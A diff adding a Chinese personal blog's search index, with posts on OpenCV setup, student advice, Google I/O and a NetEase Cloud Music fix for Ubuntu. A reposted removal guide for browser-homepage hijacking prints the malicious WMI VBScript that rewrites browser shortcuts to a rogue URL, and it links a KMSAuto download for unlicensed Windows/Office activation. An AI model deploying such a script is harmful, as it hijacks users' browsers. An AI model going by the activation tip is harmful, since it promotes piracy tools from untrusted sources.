+    return 0;
+}    
+</code></pre><p>一切准备好了，现在，直接按 F5 运行即可。不出意外，你会看到下图，如果出现问题，请检查以上步骤。</p>
+<p><img src="https://miao.su/images/2018/04/27/result90832.png" alt="result90832.png"></p>
+<hr>
+<p>关于 SIFT 算法的程序问题，新建项目时推荐新建 <code>Windows控制台应用程序</code> ，网上的程序可能会因为配置的 OpenCV 的路径不同，无法在你的电脑上运行（即找不到头文件），所以如果你使用本文的方法配置环境，对于 OpenCV 的扩展头文件应使用如下形式： <code>#include &quot;opencv2/highgui/highgui.hpp&quot;</code></p>
+<hr>
+<p>ps: 此方法在每次新建项目后都要重新配置，貌似是 vs2017 无法全局配置，可以尝试将配置导出，以后直接导入配置，应该会方便些，具体方法这里就不说了（或者其他的配置方式）。</p>
+<hr>
+<p>本文部分内容及代码借鉴自此博主 <a href="https://charlottehong.blogspot.tw/" target="_blank" rel="noopener">Charlotte.HonG</a> 的文章 <a href="https://charlottehong.blogspot.com/2017/06/opencv-320-vc14-visual-studio-2017.html?showComment=1524791827206#c7492050726078333196" target="_blank" rel="noopener">[圖文] OpenCV 3.4.1 安裝配置在 Visual Studio 2017</a> （感谢 <a href="https://charlottehong.blogspot.tw/" target="_blank" rel="noopener">Charlotte.HonG</a> ^_^）</p>
+]]></content>
+      
+        <categories>
+            
+            <category> OpenCV </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> OpenCV </tag>
+            
+            <tag> VS </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Chrome主页被篡改后如何解决？(部分内容转载)]]></title>
+      <url>https://blog.yanggang.cool/2018/01/22/Chrome%E4%B8%BB%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%90%8E%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。</p>
+<a id="more"></a>
+<p>篡改浏览器的主页有很多种途径，最常见的就是直接去修改应用程序的快捷方式的 Command line ，强制在默认代码后加入将被导向的流氓网址。用这种方法可以说是挺直接的，我们也最容易发现问题所在。下面转载一篇今天发现并用到的一篇文章，希望能够给您带来一些帮助。</p>
+<p>以下为原文：</p>
+<p><hr></p>
+<p></p><p>最近重装了一次电脑。尽管什么百度系的软件我都没有下载，Chrome浏览器的主页还是被硬生生劫持了。每次点开后的主页是<a href="https://link.zhihu.com/?target=http%3A//hao.qquu8.com" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">http://</span><span class="visible">hao.qquu8.com</span><span class="invisible"></span></a>这个链接，紧接着它会跳向hao123。电脑上原装的其他浏览器（IE和Edge）也是这样，弄得每次打开浏览器就被恶心一下，很是恼火。</p><p><br></p><p></p>
+<p><div align="center">
+![](https://pic1.zhimg.com/80/v2-caab8e64d2116cc4a155f646f8093218_hd.jpg)
+</div></p>
+<p></p><p><br></p><p>我们先来看看问题在哪。右键快捷方式查看属性：</p><p><br></p><p></p>
+<p><div align="center">
+![](https://pic1.zhimg.com/50/v2-e22306ce7f2f7559ff99a1a6489a324b_hd.jpg)
+</div></p>
+<p></p><p><br></p><p>哦，原来快捷方式被改了，后面加了一段url。把它删了试试？</p><p>还是不行，几分钟后还是被改回来了。</p><p>我在很多平台上找了解决办法。有的试了没有效果，重新开机后还是一样的毛病，有的推荐装“管家”，但这种以毒攻毒的办法无异于饮鸩止渴。最后终于有一种靠谱的方法，经过实验和一点修改，完美解决！</p><p>主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：<a href="https://link.zhihu.com/?target=https%3A//arlenluo.github.io./images/post6/WMITools.exe" class=" wrap external" target="_blank" rel="nofollow noreferrer">WMI工具</a>。</p><p>之后打开WMI Event Viewer：</p><p><br></p> <p></p>
+<p><div align="center">
+![](https://pic2.zhimg.com/50/v2-3246c0019fcd49aa591733efb67a0e10_hd.jpg)
+</div></p>
+<p></p><p><br></p><p>点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目：</p><p><br></p><div align="center">
+![](https://pic1.zhimg.com/50/v2-4f424c287c30e2a2ef31acc14043c1c9_hd.jpg)
+</div><p></p>
+<p></p><p><br></p><p>在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性：</p><p><br></p><p></p>
+<p><div align="center">
+![](https://pic7.zhimg.com/50/v2-d6376daf291d17833f10b6976246af9b_hd.jpg)
+</div></p>
+<p></p><p><br></p><p>在Script Text那一栏我们可以看到这段脚本：</p><div class="highlight"><pre><code class="language-text"><span></span>On Error Resume Next<p></p>
+<p>Const link = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j</a>“<br>Const link360 = “<a href="http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3" target="_blank" rel="noopener">http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3</a>“<br>browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”<br>lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”<br>browsersArr = split(browsers,”,”)<br>Set oDic = CreateObject(“scripting.dictionary”)<br>For Each browser In browsersArr<br>​    oDic.Add LCase(browser), browser<br>Next<br>lnkpathsArr = split(lnkpaths,”,”)<br>Set oFolders = CreateObject(“scripting.dictionary”)<br>For Each lnkpath In lnkpathsArr<br>​    oFolders.Add lnkpath, lnkpath<br>Next<br>Set fso = CreateObject(“Scripting.Filesystemobject”)<br>Set WshShell = CreateObject(“Wscript.Shell”)<br>For Each oFolder In oFolders<br>​    If fso.FolderExists(oFolder) Then<br>​        For Each file In fso.GetFolder(oFolder).Files<br>​            If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then<br>​                Set oShellLink = WshShell.CreateShortcut(file.Path)<br>​                path = oShellLink.TargetPath<br>​                name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)<br>​                If oDic.Exists(LCase(name)) Then<br>​                    If LCase(name) = LCase(“360se.exe”) Then<br>​                        oDicShellLink.Arguments = link360<br>​                    Else<br>​                        oShellLink.Arguments = link<br>​                    End If<br>​                    If file.Attributes And 1 Then<br>​                        fsoile.Attributes = file.Attributes - 1<br>​                    End If<br>​                    oShellLink.Save<br>​                End If<br>​            End If<br>​        Next<br>​    End If<br>Next<br>&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</p><p>终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。</p><p>查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name="VBScriptKids_filter"右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持：</p><p><br></p><div align="center">
+![](https://pic2.zhimg.com/50/v2-a571e709fb0cb04219e7f25489fd2272_hd.jpg)
+</div><p></p>
+<p></p><p><br></p><p>当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。</p><p>最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款<a href="https://link.zhihu.com/?target=https%3A//myfreeproject.com/soft/81-kmsauto-net-2016.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">俄罗斯人开发的工具</a>，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：<a href="https://link.zhihu.com/?target=https%3A//arlenluo.github.io./images/post6/KMSAuto-Net-1.4.9.zip" class=" wrap external" target="_blank" rel="nofollow noreferrer">KMSAuto</a></p><p>详见<a href="https://link.zhihu.com/?target=https%3A//jing-luo.github.io/2017/03/DefeatYourBrowser/" class=" wrap external" target="_blank" rel="nofollow noreferrer">抢救被流氓网站劫持的浏览器主页</a></p><hr><p></p>
+<p>注：</p>
+<p>转载自知乎</p>
+<p>原作者： <a href="https://www.zhihu.com/people/a_huang/activities" target="_blank" rel="noopener">七个太阳</a></p>
+<p>原文链接： <a href="https://www.zhihu.com/question/21883209/answer/151221887" target="_blank" rel="noopener">为什么 Chrome 浏览器的主页会被篡改为 hao123 ？遇到这种情况要如何修复？ 七个太阳的回答</a></p>
+<p>转载以经作者授权，如需二次转载，请务必联系原作者，在此感谢原作者的文章及授权。</p>
+<hr></code></pre></div>]]></content>
+      
+        <categories>
+            
+            <category> Tips </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> chrome </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[给大学生的几条良心建议（转载）]]></title>
+      <url>https://blog.yanggang.cool/2017/05/19/%E7%BB%99%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9A%84%E5%87%A0%E6%9D%A1%E8%89%AF%E5%BF%83%E5%BB%BA%E8%AE%AE%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a>
+<h4 id="原文：by-stormzhang"><a href="#原文：by-stormzhang" class="headerlink" title="原文：by:stormzhang"></a>原文：by:<a href="http://stormzhang.com" target="_blank" rel="noopener">stormzhang</a></h4><p>这篇文章是我写给小密圈中 20% 比例的大学生的，但是考虑到我公众号的读者中也有不少也是大学生或者研究生，所以姑且分享出来，希望对更多的还在校园的同学有所帮助与思考，更希望能够消除你们对未来的迷茫与恐慌。</p>
+<ol>
+<li>绝大部分的大学教育都是渣</li>
+</ol>
+<p>可能有人觉得话说的有点难听，但是事实就是如此，这不是大学的问题，本质上是中国教育的问题，中国的教育一向都是「灌输式」教学，成绩差跟成绩好的同学唯一的区别就是，成绩好的会很努力的去记那些理论性的东西，会非常在意自己的分数与奖项，成绩差的同学则比较懒，但不是笨，甚至很多人比成绩好的同学要聪明，但是本质上，他们都清一色的不知道自己所学的那些东西到底有什么用？这个才是最可悲的地方。</p>
+<p>所以，如果你在学校的成绩比较好，那么别骄傲，你只不过会是在毕业后的应聘简历上多一条「大学奖学金获得者」而已，其他没什么特别大的优势，成绩差的也别灰心，你只是比较懒，不愿让自己的付出回报不成正比而已。那些学校好的与学校差的同学，也只是在学历上的一点优势而已，中国绝大部分的学校教育都缺乏讨论、缺乏思考、缺乏实践。</p>
+<p>当然，名校肯定比一般的学校要好，这个毋庸置疑，而且平均水平肯定是名校比一般学校出来的人才更多，但是也只是平均而已，我跟比尔盖茨平均起来，我也是亿万富翁了，根本还是取决于个人。</p>
+<ol>
+<li>你现在的专业跟你以后的工作可能没什么关系</li>
+</ol>
+<p>很多毕业生毕业总是奢求能找到一份专业对口的工作，我告诉你，这很难，本质上也是因为中国的教育造成的，前面说到，你在学校学到的东西根本不知道以后干嘛用的。</p>
+<p>拿计算机专业的举例，正是因为计算机专业的同学大学学了一堆什么计算机网络、操作系统，C 语言、数据结构等等，都是最最枯燥、最最乏味的课程，你学了四年，你从来不知道这些东西能做什么用？导致很多计算机专业的同学对自己的课程很厌恶，甚至到了抵触的心理，这也直接造成很多计算机专业的同学毕业后有很多去做了销售，等你工作后才发现，反而工作中从事编程行业的，却很多不是计算机专业的，有很多都是其他理科类专业的同学，而且这部分人大部分是因为毕业后工作接触到了编程，对此产生兴趣，知道这个能赚钱，所以发奋自学，从而走上了这一行。</p>
+<p>所以，不管你是什么专业的，如果对本专业感兴趣，那还好，毕业之后尽量去找个专业相关的工作，如果对本专业不感兴趣，想从事别的行业，别担心，只要你感兴趣，肯用心去学习，那么一定不是问题，有时候甚至比那些科班生出身更有优势，因为这个职业是你自己出于兴趣以及回报而选择的，没有任何人逼你，你会更有动力去学习。</p>
+<ol>
+<li>「学习能力」是大学四年学到的最重要技能</li>
+</ol>
+<p>前面虽然把大学说的一无是处，有人会问，那干脆别读大学好了，这当然是不行的。虽然中国的大学教育有它各种各样的问题，但是这个时代，首先大学文凭是一个硬性规定，没有大学学历，你是很难在社会上立足的，起点会非常难。其次，大学跟高中的形式有着本质的区别，高中的教育是家长和老师的驱动下，面对种种压力你不得不去学习，所以高中的学习是压力下不得不去做的事。</p>
+<p>但是大学可就不一样了，没人看着你，没人会关注到你，你有更多的自由与选择空间，玩什么，结实什么样的人，去不去上课都完全取决于你，我相信绝大部分大学生的考试复习大都集中在考试前的最后两周，这种学习完全是自我驱动的，所以，大学还是非常有必要上的，而且每个人最主要的区别可能就体现在了「学习能力」上，因为你会发现，大家都是上着同样的课，甚至有的人根本不去听课，但是同样是最后两周的自学冲刺，有的人就能轻松考过，或者考了很高的分数，有的人却学了很久依然考的不理想，这就是学习能力的差异。</p>
+<p>即使是玩游戏，同样的时间，有的人玩的很好，会分析怎么出装更合理，团队战术怎么更容易取胜，有的人，却是一直沉迷于游戏，自制力很弱，而且还很有可能玩的不行。</p>
+<p>所以，自制力很好，学习能力很不错的人，会在以后的职场有更多、更好的选择，而且也容易有更好的发展，即使这个人在大学喜欢玩游戏，即使在大学成绩很一般。</p>
+<ol>
+<li>多动手，多实习</li>
+</ol>
+<p>前面说了，大学学的都是一些理论性的东西，你根本不知道那些东西能干嘛，但是如果你能尽早去实习，尽早去参与实践，那你会有别样的体会。</p>
+<p>举个例子，当计算机专业的同学都不知道所学的理论能干嘛的时候，你就去一家企业实习了，即使平时的工作只是打杂，但是你能真正认识了实际工作中是怎样的，别人在工作的时候用到了什么技能，看到别人拿到的高薪，你会发现原来，你所学的那些东西这么值钱，你会更有动力去学习，而且很有针对性的去学习，你得相信，理论与实践相结合，比那些只会闷头读书的人要有用的多，你想要的不是只在学校里空虚的考试分数而已，你更想要的是未来用自己的技能换取财富的能力！</p>
+<ol>
+<li>这些事情你该在大学就做了</li>
+</ol>
+<p>我以一个过来人的经验，真心建议你们，大学这些事必须要做了，甚至比拿什么奖学金，考什么证还要重要。</p>
+<p>多运动，坚持运动，有个好的身体比什么都重要。</p>
+<p>多阅读，坚持阅读，哪怕跟你的专业无关的书籍。</p>
+<p>考个驾照，一定要考，这个是 100% 所有工作之后的人最后悔的一件事，是的，就是 100%。</p>
+<p>如果可以的话，谈场恋爱吧，哪怕最后以失败告终。</p>
+<p>PS：以上就是我过来人的经验之谈，希望可以对更多的人有帮助，觉得有用，可以随手转发，谢谢。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 转载 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Google I/O 17]]></title>
+      <url>https://blog.yanggang.cool/2017/05/10/Google-I-O-17-1/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a>
+<p>&lt;/br&gt;</p>
+<svg width="277" height="95" viewbox="0 0 277 95" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path fill="#5471F9" d="M195.129 90.674h6.85V2.514h-6.85zm-111.083 0h6.85V24.919h-6.85zM81.709 8.359c0-3.238 2.619-5.845 5.871-5.845 3.253 0 5.872 2.607 5.872 5.845 0 3.237-2.62 5.845-5.872 5.845s-5.871-2.608-5.871-5.845M220.1 9.81l-.014-7.191 40.773-.082.014 7.192z"/><path fill="#40E7B8" d="M232.99 92.868l-6.122-3.06 43.927-87.052 6.122 3.06z"/><path fill="#5471F9" d="M147.112 38.276L143.7 21.693l2.409-.32 3.39 16.581z"/><path stroke="#5471F9" stroke-width=".5" d="M147.112 38.276L143.7 21.693l2.409-.32 3.39 16.581z"/><path fill="#5471F9" d="M154.681 42.097l3.674-16.528 2.33.686-3.691 16.517z"/><path stroke="#5471F9" stroke-width=".5" d="M154.681 42.097l3.674-16.528 2.33.686-3.691 16.517z"/><path fill="#5471F9" d="M160.062 48.656l10.075-13.638 1.852 1.565-10.086 13.62z"/><path stroke="#5471F9" stroke-width=".5" d="M160.062 48.656l10.075-13.638 1.852 1.565-10.086 13.62z"/><path fill="#5471F9" d="M162.295 56.817l14.79-8.357 1.05 2.182-14.794 8.336z"/><path stroke="#5471F9" stroke-width=".5" d="M162.295 56.817l14.79-8.357 1.05 2.182-14.794 8.336z"/><path fill="#5471F9" d="M161.014 65.196l16.922-1.697.074 2.418-16.916 1.677z"/><path stroke="#5471F9" stroke-width=".5" d="M161.014 65.196l16.922-1.697.074 2.418-16.916 1.677z"/><path fill="#5471F9" d="M156.424 72.312l16.152 5.301-.92 2.238-16.138-5.317z"/><path stroke="#5471F9" stroke-width=".5" d="M156.424 72.312l16.152 5.301-.92 2.238-16.138-5.317z"/><path fill="#5471F9" d="M149.331 76.977l12.615 11.353-1.751 1.677-12.597-11.363z"/><path stroke="#5471F9" stroke-width=".5" d="M149.331 76.977l12.615 11.353-1.751 1.677-12.597-11.363z"/><path fill="#5471F9" d="M140.96 78.353l6.81 15.512-2.29.811-6.788-15.513z"/><path stroke="#5471F9" stroke-width=".5" d="M140.96 78.353l6.81 15.512-2.29.811-6.788-15.513z"/><path fill="#5471F9" d="M132.715 76.253l-.02 16.927-2.424-.171.04-16.92z"/><path stroke="#5471F9" stroke-width=".5" d="M132.715 76.253l-.02 16.927-2.424-.171.04-16.92z"/><path fill="#5471F9" d="M126.049 70.982l-6.923 15.462-2.145-1.136 6.937-15.448z"/><path stroke="#5471F9" stroke-width=".5" d="M126.049 70.982l-6.923 15.462-2.145-1.136 6.937-15.448z"/><path fill="#5471F9" d="M122.106 63.49l-12.627 11.34-1.498-1.904 12.634-11.32z"/><path stroke="#5471F9" stroke-width=".5" d="M122.106 63.49l-12.627 11.34-1.498-1.904 12.634-11.32z"/><path fill="#5471F9" d="M121.573 55.072l-16.188 5.192-.582-2.348 16.187-5.17z"/><path stroke="#5471F9" stroke-width=".5" d="M121.573 55.072l-16.188 5.192-.582-2.348 16.187-5.17z"/><path fill="#5471F9" d="M124.507 47.11l-16.917-1.736.417-2.382 16.908 1.754z"/><path stroke="#5471F9" stroke-width=".5" d="M124.507 47.11l-16.917-1.736.417-2.382 16.908 1.754z"/><path fill="#5471F9" d="M130.436 41.046l-14.764-8.403 1.35-2.01 14.748 8.415z"/><path stroke="#5471F9" stroke-width=".5" d="M130.436 41.046l-14.764-8.403 1.35-2.01 14.748 8.415z"/><path fill="#5471F9" d="M138.337 37.891l-10.053-13.653 2.054-1.291 10.034 13.66z"/><path stroke="#5471F9" stroke-width=".5" d="M138.337 37.891l-10.053-13.653 2.054-1.291 10.034 13.66z"/><path fill="#40E7B8" d="M46.11 21.874l-.006-3.01 17.065-.033.005 3.01zm-22.642 0l-.006-3.01 17.064-.033.006 3.01zm-23.462 0L0 18.864l17.064-.033.006 3.01zM46.11 44.615l-.006-3.01 17.065-.034.005 3.01zm-22.642 0l-.006-3.01 17.064-.034.006 3.01zm-23.462 0L0 41.605l17.064-.034.006 3.01z"/><path fill="#32E8B7" d="M21.897 17.472l-3.024.006L18.839.493l3.024-.005z"/><path fill="#40E7B8" d="M21.897 40.008l-3.023.006-.035-16.984 3.024-.006zm0 23.352l-3.023.006-.035-16.984 3.024-.006z"/><path fill="#32E8B7" d="M44.745 17.472l-3.024.006L41.687.493 44.71.488z"/><path fill="#40E7B8" d="M44.745 40.008l-3.024.006-.034-16.984 3.023-.006zm0 23.352l-3.024.006-.034-16.984 3.023-.006z"/></g></svg>
+
+<p>&lt;/br&gt;</p>
+<font size="6">**Google I/O is an annual developer festival held at the outdoor Shoreline Amphitheatre.**</font>
+<br><font size="5">May 17-19, 2017</font>
+<br><font size="4">Shoreline Amphitheatre Mountain View, California</font>
+
+<p>&lt;/br&gt;</p>
+<iframe src="https://events.google.com/io/embed" style="width:700px;height:360px" frameborder="0" allowfullscreen></iframe>
+
+<p>​    </p>
+<p>&lt;/br&gt;<font size="4">官方网站：<a href="https://events.google.com/io/" target="_blank" rel="noopener">Google I/O17</a></font></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> Google </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[修复Ubuntu17.04无法安装网易云音乐问题（转载）]]></title>
+      <url>https://blog.yanggang.cool/2017/04/17/%E4%BF%AE%E5%A4%8DUbuntu17.04%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E9%97%AE%E9%A2%98/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>装了Ubuntu17.04的用户会出现这一问题，原因是libqt5libqgtk2的依赖问题，这里需要将其替换为qt5-style-plugins. </p>
+<a id="more"></a>
+<p>教程如下（以下内容来自互联网）：</p>
+<p>1.下载deb包，备用</p>
+<p><a href="http://music.163.com/#/download" target="_blank" rel="noopener">网易云音乐</a></p>
+<p>2.安装一些编译时需要的程序 </p>
+<p><code>sudo apt-get install build-essential debhelper make autoconf automake dpkg-dev fakeroot pbuilder gnupg</code></p>
+<p>3.解包</p>
+<p>建立目录<br><code>sudo mkdir -p netease/DEBIAN</code></p>
+<p><code>sudo mkdir fix</code></p>
+<p>解包<br><code>sudo dpkg -x netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb ./netease</code></p>
+<p>解出控制文件<br><code>sudo dpkg -e netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb netease/DEBIAN/</code></p>
+<p>修改控制文件<br><code>sudo gedit netease/DEBIAN/control</code></p>
+<p>找到 libqt5libqgtk2 ，替换为 qt5-style-plugins ，保存，退出。</p>
+<p>4.重新打包</p>
+<p><code>sudo dpkg-deb -b netease/fix/</code></p>
+<p>5.安装</p>
+<p><code>sudo dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb</code></p>
+<p>6.至此，理论上不会出错。</p>
+<p>（如若报错尝试命令<code>sudo apt-get install -f</code>）</p>
+<p>PS:修改过的包</p>
+<p><a href="https://mega.nz/#!DtcQgLaT" target="_blank" rel="noopener">网易云音乐fixed</a>    密钥：!aTE_wj3jalmc7Gu5rxhgM3WpLtGzv6ymBrbgJCpDEIg</p>
+]]></content>
+      
+        <categories>
+            
+            <category> Tips </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 网易云音乐 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Hello World]]></title>
+      <url>https://blog.yanggang.cool/2017/02/17/Hello-World/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://miao.su/image/jOMk0" target="_blank" rel="noopener"><img src="https://miao.su/images/2017/04/30/6c2fc79ely1fetwfnj13oj20pp0bzwgz3127f.md.jpg" alt="6c2fc79ely1fetwfnj13oj20pp0bzwgz3127f.md.jpg"></a><br><a href="https://miao.su/image/jOJYO" target="_blank" rel="noopener"><img src="https://miao.su/images/2017/04/30/6c2fc79ely1fetwfnrishj20pp0bzmzqb2fe6.md.jpg" alt="6c2fc79ely1fetwfnrishj20pp0bzmzqb2fe6.md.jpg"></a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> HelloWorld </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+  
+  
 </search>
